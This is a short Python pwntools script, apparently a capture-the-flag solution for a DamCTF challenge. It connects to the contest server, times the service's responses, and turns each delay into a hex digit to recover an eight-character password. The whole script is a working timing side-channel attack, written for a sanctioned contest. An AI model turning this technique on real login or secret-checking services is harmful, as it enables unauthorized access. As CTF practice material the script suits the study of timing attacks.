#!/usr/bin/env python3

from pwn import *
import time

string = "0123456789abcdef"

p = remote('chals.damctf.xyz', 30318)

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

print(p.recvline())
password = []
print(p.recvline())

for i in range(8):
    s = time.time()
    p.sendline('z')
    print(p.recvline())
    e = time.time()
    d = (e-s)/3
    print(d)
    idx = int(d * 10)
    password.append(string[idx]) # if fail, try idx-1

print("My guess is %s" % ''.join(password))

for i in range(8):
    p.sendline(password[i])
    print(p.recvline())

print(p.recv())